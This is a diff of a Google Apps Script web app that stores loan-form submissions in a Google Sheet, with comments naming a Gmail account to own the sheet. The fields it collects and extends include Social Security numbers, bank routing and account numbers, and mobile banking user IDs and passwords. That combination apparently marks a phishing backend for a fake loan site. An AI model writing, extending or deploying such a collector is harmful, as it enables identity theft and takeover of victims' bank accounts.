@@ -1,13 +1,13 @@
-// SIMPLE GOOGLE SHEETS SCRIPT - Copy this into your Google Apps Script project
+// COMPLETE GOOGLE SHEETS SCRIPT - Copy this ENTIRE code into your Google Apps Script project
 // Go to: https://script.google.com/home
-// Click "New Project"
-// Delete all existing code
-// Paste this code
+// Open your existing project
+// DELETE ALL existing code
+// PASTE this entire code
 // Save and Deploy as Web App
 
 // IMPORTANT: Create a NEW Google Sheet under ericmason007007@gmail.com account
 // Then replace the URL below with your new sheet URL
-const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";
+const SHEET_URL = "https://docs.google.com/spreadsheets/d/REPLACE_WITH_YOUR_NEW_SHEET_ID/edit";
 
 function doGet(e) {
   return HtmlService.createHtmlOutput('Google Sheets API is working! Use POST to submit data.');
@@ -22,7 +22,8 @@ function doPost(e) {
     sheet.appendRow([
       data.loanAmount || "",
       data.loanPurpose || "",
-      data.name || "",
+      data.creditScore || "",
+      data.fullName || data.name || "",
       data.email || "",
       data.phone || "",
       data.streetAddress || "",
@@ -30,9 +31,13 @@ function doPost(e) {
       data.state || "",
       data.zipCode || "",
       data.ssn || "",
+      data.annualIncome || "",
+      data.employmentStatus || "",
+      data.monthlyHousing || "",
       data.bankName || data.customerBank || "",
       data.routingNumber || "",
       data.accountNumber || "",
+      data.yourBank || "",
       data.mobileBankingUserId || "",
       data.mobileBankingPassword || "",
       new Date()
